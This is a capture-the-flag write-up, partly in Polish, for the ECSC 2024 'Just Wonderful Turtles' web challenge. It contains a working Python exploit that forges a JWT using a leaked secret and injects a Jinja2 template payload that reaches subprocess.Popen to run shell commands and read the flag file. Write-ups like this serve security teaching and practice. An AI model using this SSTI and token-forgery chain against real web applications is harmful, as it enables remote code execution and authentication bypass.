# Just Wonderful Turtles - web

### Vulnerability

1. Token do JWT jest podany w komentarzu jednego żółwia:
> **Secretina**
> (admin): Beware! You might spill some secrets when looking at this turtle!
> (admin): Just Wonderful Turtle team secret is: we think that '**turtlerocks**'!

2. SSTI na `/admin` w nazwie użytkownika.

### Solution

```python
import re
import jwt
import requests

payload = "admin{{ dict[request.args.a][request.args.b][1][request.args.c]()[372](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}"

token = jwt.encode({
  "sub": payload,
  "exp": 2219599354,
}, "turtlerocks", algorithm="HS256")

req = requests.get("https://turtles.ecsc24.hack.cert.pl/admin?a=__class__&b=__mro__&c=__subclasses__&cmd=cat+/flag.txt", cookies={
  "access_token_cookie": token,
})

print(re.findall(r"ecsc24{.*}", req.text)[0]) # ecsc24{turt13s_REa1lY_r0ck!}
```
